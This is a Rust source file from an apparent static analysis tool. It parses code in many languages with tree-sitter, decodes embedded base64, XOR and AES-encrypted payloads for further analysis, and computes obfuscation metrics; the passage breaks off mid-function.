//! Unified source code analyzer for all AST-based languages.
#![allow(clippy::unwrap_used, clippy::expect_used)]
//!
//! This module provides a single analyzer that handles all tree-sitter supported
//! languages through configuration rather than separate implementations.
//!
//! # Design Philosophy
//!
//! Instead of having 15+ nearly-identical analyzer files, we:
//! 1. Define language configurations (tree-sitter language, node types, etc.)
//! 2. Use a single analysis pipeline that works for all languages
//! 3. Rely on the trait/YAML system for capability detection
//! 4. Keep binary analyzers (ELF, PE, Mach-O) and manifest analyzers separate

use crate::analyzers::comment_metrics::{self, CommentStyle};
use crate::analyzers::function_metrics::{self, FunctionInfo};
use crate::analyzers::symbol_extraction;
use crate::analyzers::{
    identifier_metrics, import_metrics, string_metrics, text_metrics, Analyzer, FileType,
};
use crate::capabilities::CapabilityMapper;
use crate::types::*;
use anyhow::{Context, Result};
use std::cell::RefCell;
use std::fs;
use std::path::Path;
use std::sync::Arc;
use tree_sitter::{Language, Parser};

/// Configuration for a language analyzer.
#[derive(Clone, Debug)]
pub(crate) struct LanguageConfig {
    /// Language identifier (e.g., "python", "javascript")
    pub name: &'static str,
    /// File type for reports
    pub file_type: &'static str,
    /// Human-readable description
    pub description: &'static str,
    /// Tree-sitter language
    pub language: Language,
    /// Node types for symbol/call extraction
    pub call_node_types: &'static [&'static str],
    /// Node types for function declarations
    pub function_node_types: &'static [&'static str],
    /// Field name for function names (usually "name")
    pub function_name_field: &'static str,
    /// Node types for string literals
    pub string_node_types: &'static [&'static str],
    /// Comment style for metrics
    pub comment_style: CommentStyle,
}

/// Get the language configuration for a file type.
#[must_use]
pub(crate) fn config_for_file_type(
    file_type: &crate::analyzers::FileType,
) -> Option<LanguageConfig> {
    use crate::analyzers::FileType;

    match file_type {
        FileType::Python => Some(LanguageConfig {
            name: "python",
            file_type: "python",
            description: "Python script",
            language: tree_sitter_python::LANGUAGE.into(),
            call_node_types: &["call"],
            function_node_types: &["function_definition", "async_function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "string_content"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::JavaScript => Some(LanguageConfig {
            name: "javascript",
            file_type: "javascript",
            description: "JavaScript code",
            language: tree_sitter_javascript::LANGUAGE.into(),
            call_node_types: &[
                "call_expression",
                "assignment_expression",
                "variable_declarator",
            ],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::TypeScript => Some(LanguageConfig {
            name: "typescript",
            file_type: "typescript",
            description: "TypeScript code",
            language: tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
            call_node_types: &["call_expression"],
            function_node_types: &[
                "function_declaration",
                "function_expression",
                "arrow_function",
                "method_definition",
            ],
            function_name_field: "name",
            string_node_types: &["string", "template_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Go => Some(LanguageConfig {
            name: "go",
            file_type: "go",
            description: "Go source code",
            language: tree_sitter_go::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["raw_string_literal", "interpreted_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Rust => Some(LanguageConfig {
            name: "rust",
            file_type: "rust",
            description: "Rust source code",
            language: tree_sitter_rust::LANGUAGE.into(),
            call_node_types: &["call_expression", "macro_invocation"],
            function_node_types: &["function_item"],
            function_name_field: "name",
            string_node_types: &["string_literal", "raw_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Ruby => Some(LanguageConfig {
            name: "ruby",
            file_type: "ruby",
            description: "Ruby script",
            language: tree_sitter_ruby::LANGUAGE.into(),
            call_node_types: &["call", "method_call"],
            function_node_types: &["method", "singleton_method"],
            function_name_field: "name",
            string_node_types: &[
                "string",
                "string_content",
                "simple_symbol",
                "delimited_symbol",
                "bare_symbol",
                "hash_key_symbol",
            ],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Php => Some(LanguageConfig {
            name: "php",
            file_type: "php",
            description: "PHP script",
            language: tree_sitter_php::LANGUAGE_PHP.into(),
            call_node_types: &["function_call_expression"],
            function_node_types: &["function_definition", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "encapsed_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Shell => Some(LanguageConfig {
            name: "shell",
            file_type: "shell",
            description: "Shell script",
            language: tree_sitter_bash::LANGUAGE.into(),
            call_node_types: &["command", "command_name"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "raw_string"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Lua => Some(LanguageConfig {
            name: "lua",
            file_type: "lua",
            description: "Lua script",
            language: tree_sitter_lua::LANGUAGE.into(),
            call_node_types: &["function_call"],
            function_node_types: &["function_declaration", "local_function"],
            function_name_field: "name",
            string_node_types: &["string"],
            comment_style: CommentStyle::Lua,
        }),
        FileType::Perl => Some(LanguageConfig {
            name: "perl",
            file_type: "perl",
            description: "Perl script",
            language: tree_sitter_perl::LANGUAGE.into(),
            call_node_types: &["function_call", "method_call"],
            function_node_types: &["subroutine_declaration", "method_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "interpolated_string"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::PowerShell => Some(LanguageConfig {
            name: "powershell",
            file_type: "powershell",
            description: "PowerShell script",
            language: tree_sitter_powershell::LANGUAGE.into(),
            call_node_types: &["command_expression", "invocation_expression"],
            function_node_types: &["function_statement"],
            function_name_field: "name",
            string_node_types: &["string_literal", "expandable_string_literal"],
            comment_style: CommentStyle::Hash,
        }),
        FileType::Java => Some(LanguageConfig {
            name: "java",
            file_type: "java",
            description: "Java source code",
            language: tree_sitter_java::LANGUAGE.into(),
            call_node_types: &["method_invocation"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::CSharp => Some(LanguageConfig {
            name: "csharp",
            file_type: "csharp",
            description: "C# source code",
            language: tree_sitter_c_sharp::LANGUAGE.into(),
            call_node_types: &["invocation_expression"],
            function_node_types: &["method_declaration", "constructor_declaration"],
            function_name_field: "name",
            string_node_types: &["string_literal", "verbatim_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::C => Some(LanguageConfig {
            name: "c",
            file_type: "c",
            description: "C source code",
            language: tree_sitter_c::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Swift => Some(LanguageConfig {
            name: "swift",
            file_type: "swift",
            description: "Swift source code",
            language: tree_sitter_swift::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["function_declaration"],
            function_name_field: "name",
            string_node_types: &["line_string_literal", "multi_line_string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::ObjectiveC => Some(LanguageConfig {
            name: "objc",
            file_type: "objc",
            description: "Objective-C source code",
            language: tree_sitter_objc::LANGUAGE.into(),
            call_node_types: &["message_expression", "call_expression"],
            function_node_types: &["function_definition", "method_definition"],
            function_name_field: "declarator",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Groovy => Some(LanguageConfig {
            name: "groovy",
            file_type: "groovy",
            description: "Groovy source code",
            language: tree_sitter_groovy::LANGUAGE.into(),
            call_node_types: &["method_call", "function_call"],
            function_node_types: &["method_declaration", "function_declaration"],
            function_name_field: "name",
            string_node_types: &["string", "gstring"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Scala => Some(LanguageConfig {
            name: "scala",
            file_type: "scala",
            description: "Scala source code",
            language: tree_sitter_scala::LANGUAGE.into(),
            call_node_types: &["call_expression", "apply_expression"],
            function_node_types: &["function_definition"],
            function_name_field: "name",
            string_node_types: &["string", "interpolated_string"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Zig => Some(LanguageConfig {
            name: "zig",
            file_type: "zig",
            description: "Zig source code",
            language: tree_sitter_zig::LANGUAGE.into(),
            call_node_types: &["call_expression"],
            function_node_types: &["fn_decl"],
            function_name_field: "name",
            string_node_types: &["string_literal"],
            comment_style: CommentStyle::CStyle,
        }),
        FileType::Elixir => Some(LanguageConfig {
            name: "elixir",
            file_type: "elixir",
            description: "Elixir source code",
            language: tree_sitter_elixir::LANGUAGE.into(),
            call_node_types: &["call"],
            function_node_types: &["call"], // def/defp are calls in Elixir's AST
            function_name_field: "target",
            string_node_types: &["string", "charlist"],
            comment_style: CommentStyle::Hash,
        }),
        _ => None,
    }
}

/// Unified source code analyzer.
///
/// Works with any tree-sitter supported language through configuration.
pub(crate) struct UnifiedSourceAnalyzer {
    config: LanguageConfig,
    file_type: crate::analyzers::FileType,
    parser: RefCell<Parser>,
    capability_mapper: Arc<CapabilityMapper>,
}

impl std::fmt::Debug for UnifiedSourceAnalyzer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("UnifiedSourceAnalyzer")
            .field("config", &self.config)
            .field("file_type", &self.file_type)
            .field("parser", &"<Parser>")
            .field("capability_mapper", &self.capability_mapper)
            .finish()
    }
}

impl UnifiedSourceAnalyzer {
    /// Create a new analyzer for the given language configuration.
    pub(crate) fn new(
        config: LanguageConfig,
        file_type: crate::analyzers::FileType,
    ) -> anyhow::Result<Self> {
        let mut parser = Parser::new();
        parser
            .set_language(&config.language)
            .map_err(|e| anyhow::anyhow!("Failed to load language grammar: {:?}", e))?;

        Ok(Self {
            config,
            file_type,
            parser: RefCell::new(parser),
            capability_mapper: Arc::new(CapabilityMapper::empty()),
        })
    }

    /// Create an analyzer for the given file type.
    #[must_use]
    pub(crate) fn for_file_type(file_type: &crate::analyzers::FileType) -> Option<Self> {
        config_for_file_type(file_type).and_then(|config| Self::new(config, file_type.clone()).ok())
    }

    /// Create analyzer with pre-existing capability mapper (wraps in Arc)
    pub(crate) fn with_capability_mapper(mut self, capability_mapper: CapabilityMapper) -> Self {
        self.capability_mapper = Arc::new(capability_mapper);
        self
    }

    /// Create analyzer with shared capability mapper (avoids cloning)
    pub(crate) fn with_capability_mapper_arc(
        mut self,
        capability_mapper: Arc<CapabilityMapper>,
    ) -> Self {
        self.capability_mapper = capability_mapper;
        self
    }

    pub(crate) fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
        // For backward compatibility, use UTF-8 bytes
        self.analyze_source_with_original(file_path, content, content.as_bytes())
    }

    pub(crate) fn analyze_source_with_original(
        &self,
        file_path: &Path,
        content: &str,
        original_bytes: &[u8],
    ) -> Result<AnalysisReport> {
        let start = std::time::Instant::now();

        // Parse the source
        let tree = self
            .parser
            .borrow_mut()
            .parse(content, None)
            .with_context(|| format!("Failed to parse {} source", self.config.name))?;

        let root = tree.root_node();

        // Create target info
        let target = TargetInfo {
            path: file_path.display().to_string(),
            file_type: self.config.file_type.to_string(),
            size_bytes: content.len() as u64,
            sha256: crate::analyzers::utils::calculate_sha256(content.as_bytes()),
            architectures: None,
        };

        let mut report = AnalysisReport::new(target);

        // Add structural feature
        report
            .structure
            .push(crate::analyzers::utils::create_language_feature(
                self.config.name,
                &format!("tree-sitter-{}", self.config.name),
                self.config.description,
            ));

        // Extract functions
        self.extract_functions(&root, content.as_bytes(), &mut report);

        // Extract strings
        self.extract_strings(&root, content.as_bytes(), &mut report);

        // Also run stng extraction to get fuzzy base64 and other decoded content
        // Use original_bytes (UTF-16 if present) so stng can detect BOM and use fuzzy base64
        let opts = stng::ExtractOptions::new(4)
            .with_garbage_filter(true)
            .with_xor(None);
        let stng_strings = stng::extract_strings_with_options(original_bytes, &opts);

        // Convert stng strings to StringInfo and add to report
        for es in stng_strings {
            // Only add decoded strings (base64, xor, etc.) - skip raw literals already in AST
            if matches!(
                es.method,
                stng::StringMethod::Base64Decode
                    | stng::StringMethod::Base64ObfuscatedDecode
                    | stng::StringMethod::XorDecode
                    | stng::StringMethod::HexDecode
                    | stng::StringMethod::UrlDecode
                    | stng::StringMethod::UnicodeEscapeDecode
            ) {
                let string_type = match es.kind {
                    stng::StringKind::ShellCmd => crate::types::StringType::ShellCmd,
                    stng::StringKind::Url => crate::types::StringType::Url,
                    _ => crate::types::StringType::Const,
                };

                let encoding_method = match es.method {
                    stng::StringMethod::Base64Decode => "base64",
                    stng::StringMethod::Base64ObfuscatedDecode => "base64-obf",
                    stng::StringMethod::XorDecode => "xor",
                    stng::StringMethod::HexDecode => "hex",
                    stng::StringMethod::UrlDecode => "url",
                    stng::StringMethod::UnicodeEscapeDecode => "unicode-escape",
                    _ => "",
                };

                report.strings.push(crate::types::StringInfo {
                    value: es.value,
                    offset: Some(es.data_offset),
                    string_type,
                    encoding: "utf-8".to_string(),
                    section: Some("decoded".to_string()),
                    encoding_chain: if !encoding_method.is_empty() {
                        vec![encoding_method.to_string()]
                    } else {
                        Vec::new()
                    },
                    fragments: None,
                });
            }
        }

        // Extract and analyze base64/zlib encoded payloads (same treatment as archives)
        let opts = stng::ExtractOptions::new(16).with_garbage_filter(true);
        let stng_strings = stng::extract_strings_with_options(content.as_bytes(), &opts);
        let extracted_payloads = crate::extractors::extract_encoded_payloads(&stng_strings);
        for (idx, payload) in extracted_payloads.iter().enumerate() {
            // Create virtual path with encoding info using ## delimiter for decoded content
            let virtual_path = crate::types::encode_decoded_path(
                &file_path.display().to_string(),
                &["base64".to_string()],
                idx,
            );

            // Read the decoded content
            let payload_content = std::fs::read(&payload.temp_path).unwrap_or_default();

            // Create ArchiveEntry metadata (same as archive files)
            let entry_metadata = crate::types::ArchiveEntry {
                path: virtual_path.clone(),
                file_type: format!("{:?}", payload.detected_type).to_lowercase(),
                sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                size_bytes: payload_content.len() as u64,
            };
            report.archive_contents.push(entry_metadata);

            // Analyze the extracted payload based on its type (creates sub_report like archives)
            // Pass capability_mapper to evaluate rules on extracted content
            let payload_report = match payload.detected_type {
                FileType::Python => {
                    if let Some(analyzer) = UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
                    {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                            .ok()
                    } else {
                        None
                    }
                }
                FileType::Shell => {
                    if let Some(analyzer) = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell) {
                        analyzer
                            .with_capability_mapper_arc(self.capability_mapper.clone())
                            .analyze_source(
                                Path::new(&virtual_path),
                                &String::from_utf8_lossy(&payload_content),
                            )
                            .ok()
                    } else {
                        None
                    }
                }
                _ => {
                    // For binary or unknown, create basic report
                    None
                }
            };

            // Process payload report - convert to FileAnalysis for v2 flat files array
            if let Some(pr) = payload_report {
                // Prefix findings with extracted payload location (same as archive: prefix)
                let mut file_entry = pr.to_file_analysis(0, true);
                file_entry.path = virtual_path.clone();
                file_entry.depth = 1; // Decoded content is one level deep
                file_entry.encoding = Some(vec!["base64".to_string()]);

                // Update evidence locations to indicate extracted payload
                for finding in &mut file_entry.findings {
                    for evidence in &mut finding.evidence {
                        match &evidence.location {
                            None => {
                                evidence.location = Some(format!("extracted:{}", virtual_path));
                            }
                            Some(loc) => {
                                evidence.location =
                                    Some(format!("extracted:{}:{}", virtual_path, loc));
                            }
                        }
                    }
                }

                file_entry.compute_summary();
                report.files.push(file_entry);
            }

            // Clean up temp file
            let _ = std::fs::remove_file(&payload.temp_path);
        }

        // Extract and analyze AES-encrypted payloads (JavaScript/TypeScript)
        if matches!(self.config.file_type, "javascript" | "typescript") {
            let aes_payloads = crate::extractors::extract_aes_payloads(content.as_bytes());
            for (idx, payload) in aes_payloads.iter().enumerate() {
                // Create virtual path with encoding info
                let virtual_path = crate::types::encode_decoded_path(
                    &file_path.display().to_string(),
                    &payload.encoding_chain,
                    idx,
                );

                // Read the decrypted content
                let payload_content = std::fs::read(&payload.temp_path).unwrap_or_default();

                // Create ArchiveEntry metadata
                let entry_metadata = crate::types::ArchiveEntry {
                    path: virtual_path.clone(),
                    file_type: format!("{:?}", payload.detected_type).to_lowercase(),
                    sha256: crate::analyzers::utils::calculate_sha256(&payload_content),
                    size_bytes: payload_content.len() as u64,
                };
                report.archive_contents.push(entry_metadata);

                // Analyze the decrypted payload
                let payload_report = match payload.detected_type {
                    FileType::JavaScript | FileType::TypeScript => {
                        if let Some(analyzer) =
                            UnifiedSourceAnalyzer::for_file_type(&payload.detected_type)
                        {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                                .ok()
                        } else {
                            None
                        }
                    }
                    FileType::Python => {
                        if let Some(analyzer) =
                            UnifiedSourceAnalyzer::for_file_type(&FileType::Python)
                        {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                                .ok()
                        } else {
                            None
                        }
                    }
                    FileType::Shell => {
                        if let Some(analyzer) =
                            UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
                        {
                            analyzer
                                .with_capability_mapper_arc(self.capability_mapper.clone())
                                .analyze_source(
                                    Path::new(&virtual_path),
                                    &String::from_utf8_lossy(&payload_content),
                                )
                                .ok()
                        } else {
                            None
                        }
                    }
                    _ => None,
                };

                // Add a structural finding for the encrypted payload
                report.structure.push(crate::types::StructuralFeature {
                    id: format!("crypto/encrypted-payload/{}", payload.algorithm),
                    desc: format!("Encrypted payload decrypted with {}", payload.algorithm),
                    evidence: vec![crate::types::Evidence {
                        method: "pattern".to_string(),
                        source: "aes_extractor".to_string(),
                        value: format!("preview={}", payload.preview),
                        location: Some(format!("offset:{}", payload.original_offset)),
                    }],
                });

                // Process payload report
                if let Some(pr) = payload_report {
                    let mut file_entry = pr.to_file_analysis(0, true);
                    file_entry.path = virtual_path.clone();
                    file_entry.depth = 1;
                    file_entry.encoding = Some(payload.encoding_chain.clone());

                    // Update evidence locations
                    for finding in &mut file_entry.findings {
                        for evidence in &mut finding.evidence {
                            match &evidence.location {
                                None => {
                                    evidence.location = Some(format!("decrypted:{}", virtual_path));
                                }
                                Some(loc) => {
                                    evidence.location =
                                        Some(format!("decrypted:{}:{}", virtual_path, loc));
                                }
                            }
                        }
                    }

                    file_entry.compute_summary();
                    report.files.push(file_entry);
                }

                // Clean up temp file
                let _ = std::fs::remove_file(&payload.temp_path);
            }
        }

        // Extract function calls for capability matching (type: symbol conditions)
        symbol_extraction::extract_symbols(
            content,
            &self.config.language,
            self.config.call_node_types,
            &mut report,
        );

        // Also extract actual module imports (require/import statements) for metadata/import/ findings
        symbol_extraction::extract_imports(content, &self.file_type, &mut report);

        // Analyze paths and environment variables
        crate::path_mapper::analyze_and_link_paths(&mut report);
        crate::env_mapper::analyze_and_link_env_vars(&mut report);

        // Compute metrics
        let mut metrics = self.compute_metrics(&root, content);

        // Compute import metrics from already-extracted imports
        if !report.imports.is_empty() {
            let file_type_str = match self.file_type {
                crate::analyzers::FileType::Python => "python",
                crate::analyzers::FileType::JavaScript => "javascript",
                crate::analyzers::FileType::TypeScript => "typescript",
                crate::analyzers::FileType::Go => "go",
                crate::analyzers::FileType::Ruby => "ruby",
                crate::analyzers::FileType::Perl => "perl",
                crate::analyzers::FileType::Lua => "lua",
                _ => "unknown",
            };
            metrics.imports = Some(import_metrics::analyze_imports(
                &report.imports,
                file_type_str,
            ));
        }

        // Compute ratio metrics from already-populated counters
        Self::compute_text_ratio_metrics(&mut metrics);

        report.metrics = Some(metrics);

        // Evaluate all rules (atomic + composite) and merge into report
        self.capability_mapper.evaluate_and_merge_findings(
            &mut report,
            content.as_bytes(),
            Some(&tree),
            None,
        );

        report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
        report.metadata.tools_used = vec![format!("tree-sitter-{}", self.config.name)];

        Ok(report)
    }

    fn extract_functions<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        self.walk_for_functions(&mut cursor, source, report, 0);
    }

    fn walk_for_functions<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
        mut depth: u32,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.function_node_types.contains(&kind) {
                let name = self
                    .extract_function_name(&node, source)
                    .unwrap_or_else(|| "anonymous".to_string());

                report.functions.push(Function {
                    name,
                    offset: Some(format!("0x{:x}", node.start_byte())),
                    size: Some((node.end_byte() - node.start_byte()) as u64),
                    complexity: None,
                    calls: Vec::new(),
                    source: format!("tree-sitter-{}", self.config.name),
                    control_flow: None,
                    instruction_analysis: None,
                    register_usage: None,
                    constants: Vec::new(),
                    properties: None,
                    signature: None,
                    nesting: None,
                    call_patterns: None,
                });
            }

            if cursor.goto_first_child() {
                if self.config.function_node_types.contains(&kind) {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent_kind = cursor.node().kind();
                if self.config.function_node_types.contains(&parent_kind) {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_name<'a>(
        &self,
        node: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> Option<String> {
        // Try the configured field name first
        if let Some(name_node) = node.child_by_field_name(self.config.function_name_field) {
            if let Ok(name) = name_node.utf8_text(source) {
                if !name.is_empty() {
                    return Some(name.to_string());
                }
            }
        }

        // Fallback: look for identifier children
        let mut cursor = node.walk();
        if cursor.goto_first_child() {
            loop {
                let child = cursor.node();
                if child.kind() == "identifier" || child.kind() == "name" {
                    if let Ok(name) = child.utf8_text(source) {
                        if !name.is_empty() {
                            return Some(name.to_string());
                        }
                    }
                }
                if !cursor.goto_next_sibling() {
                    break;
                }
            }
        }
        None
    }

    fn extract_strings<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        let mut cursor = root.walk();
        self.walk_for_strings(&mut cursor, source, report);
    }

    fn walk_for_strings<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        report: &mut AnalysisReport,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'')
                        .trim_start_matches('`')
                        .trim_end_matches('`')
                        .trim_start_matches("[[")
                        .trim_end_matches("]]")
                        .trim_start_matches("@\"")
                        .trim_end_matches("\"@")
                        .trim_start_matches(':') // Ruby symbol literals like :alias_method
                        ;

                    if !s.is_empty() && s.len() < 10000 {
                        report.strings.push(StringInfo {
                            value: s.to_string(),
                            offset: Some(node.start_byte() as u64),
                            string_type: StringType::Const,
                            encoding: "utf-8".to_string(),
                            section: Some("ast".to_string()),
                            encoding_chain: Vec::new(),
                            fragments: None,
                        });
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            loop {
                if cursor.goto_next_sibling() {
                    break;
                }
                if !cursor.goto_parent() {
                    return;
                }
            }
        }
    }

    fn compute_metrics<'a>(&self, root: &tree_sitter::Node<'a>, content: &str) -> Metrics {
        let source = content.as_bytes();
        let total_lines = content.lines().count() as u32;

        let text = text_metrics::analyze_text(content);

        let identifiers = self.extract_identifiers(root, source);
        let ident_refs: Vec<&str> = identifiers
            .iter()
            .map(std::string::String::as_str)
            .collect();
        let identifier_metrics = identifier_metrics::analyze_identifiers(&ident_refs);

        let strings = self.extract_string_values(root, source);
        let str_refs: Vec<&str> = strings.iter().map(std::string::String::as_str).collect();
        let string_metrics = string_metrics::analyze_strings(&str_refs);

        let comment_metrics = comment_metrics::analyze_comments(content, self.config.comment_style);

        let func_infos = self.extract_function_info(root, source);
        let func_metrics = function_metrics::analyze_functions(&func_infos, total_lines);

        Metrics {
            text: Some(text),
            identifiers: Some(identifier_metrics),
            strings: Some(string_metrics),
            comments: Some(comment_metrics),
            functions: Some(func_metrics),
            ..Default::default()
        }
    }

    fn extract_identifiers<'a>(&self, root: &tree_sitter::Node<'a>, source: &[u8]) -> Vec<String> {
        let mut identifiers = Vec::new();
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();
            if node.kind() == "identifier" || node.kind() == "name" {
                if let Ok(text) = node.utf8_text(source) {
                    if !text.is_empty() {
                        identifiers.push(text.to_string());
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return identifiers;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_string_values<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> Vec<String> {
        let mut strings = Vec::new();
        let mut cursor = root.walk();

        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.string_node_types.contains(&kind) || kind.contains("string") {
                if let Ok(text) = node.utf8_text(source) {
                    let s = text
                        .trim_start_matches('"')
                        .trim_end_matches('"')
                        .trim_start_matches('\'')
                        .trim_end_matches('\'');
                    if !s.is_empty() {
                        strings.push(s.to_string());
                    }
                }
            }

            if cursor.goto_first_child() {
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return strings;
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    fn extract_function_info<'a>(
        &self,
        root: &tree_sitter::Node<'a>,
        source: &[u8],
    ) -> Vec<FunctionInfo> {
        let mut functions = Vec::new();
        let mut cursor = root.walk();
        self.walk_for_function_info(&mut cursor, source, &mut functions, 0);
        functions
    }

    fn walk_for_function_info<'a>(
        &self,
        cursor: &mut tree_sitter::TreeCursor<'a>,
        source: &[u8],
        functions: &mut Vec<FunctionInfo>,
        mut depth: u32,
    ) {
        loop {
            let node = cursor.node();
            let kind = node.kind();

            if self.config.function_node_types.contains(&kind) {
                let mut info = FunctionInfo::default();
                if let Some(name) = self.extract_function_name(&node, source) {
                    info.name = name;
                }
                info.is_anonymous = info.name.is_empty();
                info.start_line = node.start_position().row as u32;
                info.end_line = node.end_position().row as u32;
                info.line_count = info.end_line.saturating_sub(info.start_line) + 1;
                info.nesting_depth = depth;
                functions.push(info);
            }

            if cursor.goto_first_child() {
                if self.config.function_node_types.contains(&kind) {
                    depth += 1;
                }
                continue;
            }
            if cursor.goto_next_sibling() {
                continue;
            }
            loop {
                if !cursor.goto_parent() {
                    return;
                }
                let parent_kind = cursor.node().kind();
                if self.config.function_node_types.contains(&parent_kind) {
                    depth = depth.saturating_sub(1);
                }
                if cursor.goto_next_sibling() {
                    break;
                }
            }
        }
    }

    /// Compute ratio and normalized metrics from already-populated AST metrics.
    /// Call this after all base counters are populated (including imports).
    /// All metrics are just division operations - zero parsing overhead.
    fn compute_text_ratio_metrics(metrics: &mut Metrics) {
        // Get references to all metric components
        let text = metrics.text.as_mut();
        let identifiers = metrics.identifiers.as_ref();
        let strings = metrics.strings.as_ref();
        let comments = metrics.comments.as_ref();
        let functions = metrics.functions.as_ref();
        let _statements = metrics.statements.as_ref();
        let imports = metrics.imports.as_ref();

        // Only proceed if we have text metrics (required for ratios)
        let Some(text) = text else { return };

        // Cross-component ratios (per function)
        if let Some(funcs) = functions {
            if funcs.total > 0 {
                if let Some(strs) = strings {
                    text.strings_to_functions_ratio = strs.total as f32 / funcs.total as f32;
                }
                if let Some(idents) = identifiers {
                    text.identifiers_to_functions_ratio =
                        idents.unique_count as f32 / funcs.total as f32;
                }
                if let Some(imps) = imports {
                    text.imports_to_functions_ratio = imps.total as f32 / funcs.total as f32;
                }
            }
        }

        // Per-line density ratios
        if text.total_lines > 0 {
            if let Some(idents) = identifiers {
                text.identifier_density = idents.total as f32 / text.total_lines as f32;
            }
            if let Some(strs) = strings {
                text.string_density = strs.total as f32 / text.total_lines as f32;
            }
            if let Some(imps) = imports {
                text.import_density = (imps.total as f32 * 100.0) / text.total_lines as f32;
            }

            // Size-independent normalized metrics
            let lines_sqrt = (text.total_lines as f32).sqrt();
            if lines_sqrt > 0.0 {
                if let Some(funcs) = functions {
                    text.normalized_function_count = funcs.total as f32 / lines_sqrt;
                }
                if let Some(imps) = imports {
                    text.normalized_import_count = imps.total as f32 / lines_sqrt;
                }
                if let Some(strs) = strings {
                    text.normalized_string_count = strs.total as f32 / lines_sqrt;
                }
            }

            let lines_log = (text.total_lines as f32).log2();
            if lines_log > 0.0 {
                if let Some(idents) = identifiers {
                    text.normalized_unique_identifiers = idents.unique_count as f32 / lines_log;
                }
            }
        }

        // Obfuscation indicator ratios
        if let Some(idents) = identifiers {
            if idents.unique_count > 0 {
                let suspicious = idents.hex_like_names
                    + idents.base64_like_names
                    + idents.sequential_names
                    + idents.keyboard_pattern_names
                    + idents.repeated_char_names;
                text.suspicious_identifier_ratio = suspicious as f32 / idents.unique_count as f32;
            }
        }

        if let Some(strs) = strings {
            if strs.total > 0 {
                let encoded = strs.base64_candidates + strs.hex_strings + strs.url_encoded_strings;
                text.encoded_string_ratio = encoded as f32 / strs.total as f32;

                let suspicious =
                    strs.embedded_code_candidates + strs.shell_command_strings + strs.sql_strings;
                text.suspicious_string_ratio = suspicious as f32 / strs.total as f32;

                let dynamic =
